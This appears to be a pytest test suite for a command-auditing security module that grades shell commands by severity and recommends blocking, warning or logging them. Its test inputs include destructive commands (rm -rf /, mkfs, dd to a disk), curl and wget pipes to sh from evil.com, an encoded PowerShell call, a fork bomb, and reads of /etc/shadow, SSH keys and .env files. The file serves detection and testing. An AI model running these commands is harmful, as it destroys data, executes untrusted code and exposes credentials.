"""Tests for the command auditor module."""

from __future__ import annotations

import pytest
from polaris.kernelone.security.command_auditor import (
    AuditConfig,
    CommandAuditEvent,
    CommandAuditor,
    CommandAuditResult,
    SeverityLevel,
)


@pytest.fixture
def auditor() -> CommandAuditor:
    """Return a fresh CommandAuditor instance."""
    return CommandAuditor()


class TestSeverityLevel:
    """Tests for SeverityLevel enum."""

    def test_severity_values(self) -> None:
        """SeverityLevel contains the expected members."""
        assert SeverityLevel.CRITICAL.value == "critical"
        assert SeverityLevel.HIGH.value == "high"
        assert SeverityLevel.MEDIUM.value == "medium"
        assert SeverityLevel.LOW.value == "low"


class TestAuditConfig:
    """Tests for AuditConfig dataclass."""

    def test_default_config(self) -> None:
        """Default thresholds and empty custom patterns."""
        cfg = AuditConfig()
        assert cfg.block_threshold == SeverityLevel.HIGH
        assert cfg.warn_threshold == SeverityLevel.MEDIUM
        assert cfg.custom_patterns == ()

    def test_custom_config(self) -> None:
        """Custom thresholds and patterns are stored correctly."""
        cfg = AuditConfig(
            block_threshold=SeverityLevel.CRITICAL,
            warn_threshold=SeverityLevel.LOW,
            custom_patterns=((r"custom_bad", SeverityLevel.HIGH),),
        )
        assert cfg.block_threshold == SeverityLevel.CRITICAL
        assert cfg.warn_threshold == SeverityLevel.LOW
        assert cfg.custom_patterns == ((r"custom_bad", SeverityLevel.HIGH),)


class TestCommandAuditResult:
    """Tests for CommandAuditResult dataclass."""

    def test_result_structure(self) -> None:
        """Result fields are populated correctly."""
        event = CommandAuditEvent(
            timestamp="2026-04-23T00:00:00+00:00",
            command_text="rm -rf /",
            matched_pattern=r"rm\s+-rf\s+[/~]",
            severity=SeverityLevel.CRITICAL,
            suggested_action="block",
        )
        result = CommandAuditResult(
            is_dangerous=True,
            severity=SeverityLevel.CRITICAL,
            events=(event,),
            recommendation="block",
        )
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert len(result.events) == 1
        assert result.recommendation == "block"


class TestCommandAuditorCritical:
    """CRITICAL severity command tests."""

    def test_rm_rf_root(self, auditor: CommandAuditor) -> None:
        """rm -rf / is CRITICAL and blocked."""
        result = auditor.audit("rm -rf /")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"
        assert any(e.severity == SeverityLevel.CRITICAL for e in result.events)

    def test_rm_rf_home(self, auditor: CommandAuditor) -> None:
        """rm -rf ~ is CRITICAL and blocked."""
        result = auditor.audit("rm -rf ~")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_rm_rf_star(self, auditor: CommandAuditor) -> None:
        """rm -rf * is CRITICAL and blocked."""
        result = auditor.audit("rm -rf *")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_rm_rf_dot(self, auditor: CommandAuditor) -> None:
        """rm -rf . is CRITICAL and blocked."""
        result = auditor.audit("rm -rf .")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_mkfs(self, auditor: CommandAuditor) -> None:
        """mkfs is CRITICAL and blocked."""
        result = auditor.audit("mkfs.ext4 /dev/sda1")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_dd_device(self, auditor: CommandAuditor) -> None:
        """dd if=/dev/ is CRITICAL and blocked."""
        result = auditor.audit("dd if=/dev/zero of=/dev/sda")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_redirect_to_device(self, auditor: CommandAuditor) -> None:
        """> /dev/sd is CRITICAL and blocked."""
        result = auditor.audit("> /dev/sda")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_format_drive(self, auditor: CommandAuditor) -> None:
        """format c: is CRITICAL and blocked."""
        result = auditor.audit("format c:")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"


class TestCommandAuditorHigh:
    """HIGH severity command tests."""

    def test_curl_pipe_sh(self, auditor: CommandAuditor) -> None:
        """curl | sh is HIGH and blocked."""
        result = auditor.audit("curl https://evil.com/install.sh | sh")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"

    def test_wget_pipe_sh(self, auditor: CommandAuditor) -> None:
        """wget | sh is HIGH and blocked."""
        result = auditor.audit("wget -O - https://evil.com/run | sh")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"

    def test_powershell_encoded(self, auditor: CommandAuditor) -> None:
        """powershell -enc is HIGH and blocked."""
        result = auditor.audit("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"

    def test_fork_bomb(self, auditor: CommandAuditor) -> None:
        """Bash fork bomb is HIGH and blocked."""
        result = auditor.audit(":(){ :|:& };:")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"


class TestCommandAuditorMedium:
    """MEDIUM severity command tests."""

    def test_eval(self, auditor: CommandAuditor) -> None:
        """eval( is MEDIUM and warned."""
        result = auditor.audit("eval(user_input)")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"

    def test_exec(self, auditor: CommandAuditor) -> None:
        """exec( is MEDIUM and warned."""
        result = auditor.audit("exec(malicious_code)")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"

    def test_os_system(self, auditor: CommandAuditor) -> None:
        """os.system is MEDIUM and warned."""
        result = auditor.audit("os.system('ls')")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"

    def test_subprocess_call(self, auditor: CommandAuditor) -> None:
        """subprocess.call is MEDIUM and warned."""
        result = auditor.audit("subprocess.call(['rm', '-rf', '/'])")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"

    def test_dunder_import_os(self, auditor: CommandAuditor) -> None:
        """__import__('os') is MEDIUM and warned."""
        result = auditor.audit("__import__('os')")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"


class TestCommandAuditorLow:
    """LOW severity command tests."""

    def test_chmod_777(self, auditor: CommandAuditor) -> None:
        """chmod -R 777 is LOW and logged."""
        result = auditor.audit("chmod -R 777 /var/www")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_chown_recursive(self, auditor: CommandAuditor) -> None:
        """chown -R is LOW and logged."""
        result = auditor.audit("chown -R user:group /data")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_chmod_000(self, auditor: CommandAuditor) -> None:
        """chmod 000 is LOW and logged."""
        result = auditor.audit("chmod 000 important.txt")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_etc_passwd(self, auditor: CommandAuditor) -> None:
        """Access to /etc/passwd is LOW and logged."""
        result = auditor.audit("cat /etc/passwd")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_etc_shadow(self, auditor: CommandAuditor) -> None:
        """Access to /etc/shadow is LOW and logged."""
        result = auditor.audit("cat /etc/shadow")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_ssh_dir(self, auditor: CommandAuditor) -> None:
        """Access to ~/.ssh is LOW and logged."""
        result = auditor.audit("cat ~/.ssh/id_rsa")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_env_file(self, auditor: CommandAuditor) -> None:
        """Access to .env is LOW and logged."""
        result = auditor.audit("cat .env")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_env_local_file(self, auditor: CommandAuditor) -> None:
        """Access to .env.local is LOW and logged."""
        result = auditor.audit("cat .env.local")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"


class TestCommandAuditorSafe:
    """Safe command tests."""

    def test_safe_ls(self, auditor: CommandAuditor) -> None:
        """ls is safe."""
        result = auditor.audit("ls -la")
        assert result.is_dangerous is False
        assert result.severity is None
        assert result.events == ()
        assert result.recommendation == "log"

    def test_safe_echo(self, auditor: CommandAuditor) -> None:
        """echo is safe."""
        result = auditor.audit("echo hello")
        assert result.is_dangerous is False
        assert result.severity is None
        assert result.events == ()

    def test_safe_git(self, auditor: CommandAuditor) -> None:
        """git status is safe."""
        result = auditor.audit("git status")
        assert result.is_dangerous is False
        assert result.severity is None

    def test_empty_string(self, auditor: CommandAuditor) -> None:
        """Empty string is safe."""
        result = auditor.audit("")
        assert result.is_dangerous is False
        assert result.severity is None


class TestCommandAuditorConfig:
    """Configurable threshold tests."""

    def test_block_threshold_critical(self, auditor: CommandAuditor) -> None:
        """When block_threshold is CRITICAL, HIGH becomes warn."""
        config = AuditConfig(block_threshold=SeverityLevel.CRITICAL)
        result = auditor.audit("curl https://x.com | sh", config=config)
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "warn"

    def test_warn_threshold_low(self, auditor: CommandAuditor) -> None:
        """When warn_threshold is LOW, LOW becomes warn."""
        config = AuditConfig(warn_threshold=SeverityLevel.LOW)
        result = auditor.audit("chmod -R 777 /tmp", config=config)
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "warn"

    def test_custom_patterns(self, auditor: CommandAuditor) -> None:
        """Custom patterns are detected and respected."""
        config = AuditConfig(
            custom_patterns=((r"dangerous_custom_cmd", SeverityLevel.HIGH),),
        )
        result = auditor.audit("dangerous_custom_cmd --force", config=config)
        assert result.is_dangerous is True
        assert any("dangerous_custom_cmd" in e.matched_pattern for e in result.events)
        assert result.severity == SeverityLevel.HIGH

    def test_custom_pattern_low_severity(self, auditor: CommandAuditor) -> None:
        """Custom patterns with LOW severity are handled correctly."""
        config = AuditConfig(
            custom_patterns=((r"suspicious_flag", SeverityLevel.LOW),),
        )
        result = auditor.audit("app --suspicious_flag", config=config)
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"


class TestCommandAuditEvent:
    """Tests for CommandAuditEvent structure."""

    def test_event_metadata(self, auditor: CommandAuditor) -> None:
        """Events carry metadata including match span."""
        result = auditor.audit("rm -rf /")
        assert len(result.events) > 0
        event = result.events[0]
        assert "match_span" in event.metadata
        assert isinstance(event.metadata["match_span"], tuple)

    def test_event_timestamp(self, auditor: CommandAuditor) -> None:
        """Events have ISO-format timestamps."""
        result = auditor.audit("eval(bad)")
        assert len(result.events) > 0
        event = result.events[0]
        assert "T" in event.timestamp

    def test_custom_event_has_custom_flag(self, auditor: CommandAuditor) -> None:
        """Custom pattern events are marked with custom=True."""
        config = AuditConfig(
            custom_patterns=((r"my_custom", SeverityLevel.MEDIUM),),
        )
        result = auditor.audit("my_custom", config=config)
        custom_events = [e for e in result.events if e.metadata.get("custom") is True]
        assert len(custom_events) > 0


class TestCommandAuditorEdgeCases:
    """Edge case tests."""

    def test_case_insensitive(self, auditor: CommandAuditor) -> None:
        """Matching is case-insensitive."""
        result = auditor.audit("RM -RF /")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL

    def test_multiple_patterns(self, auditor: CommandAuditor) -> None:
        """Commands matching multiple patterns produce multiple events."""
        result = auditor.audit("rm -rf / && curl https://x.com | sh")
        assert result.is_dangerous is True
        assert len(result.events) >= 2

    def test_highest_severity_wins(self, auditor: CommandAuditor) -> None:
        """When multiple patterns match, highest severity is reported."""
        result = auditor.audit("rm -rf / && eval(bad)")
        assert result.severity == SeverityLevel.CRITICAL

    def test_bash_c(self, auditor: CommandAuditor) -> None:
        """bash -c with rm -rf / is detected as CRITICAL (highest severity wins)."""
        result = auditor.audit("bash -c 'rm -rf /'")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL

    def test_sh_c(self, auditor: CommandAuditor) -> None:
        """sh -c is detected as HIGH."""
        result = auditor.audit("sh -c 'echo pwned'")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH

    def test_cmd_exe(self, auditor: CommandAuditor) -> None:
        """cmd.exe /c is detected as HIGH."""
        result = auditor.audit("cmd.exe /c del /f important.txt")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH

    def test_del_command(self, auditor: CommandAuditor) -> None:
        """del /f is detected as HIGH."""
        result = auditor.audit("del /f file.txt")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH

    def test_rmdir_command(self, auditor: CommandAuditor) -> None:
        """rmdir /s is detected as HIGH."""
        result = auditor.audit("rmdir /s directory")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
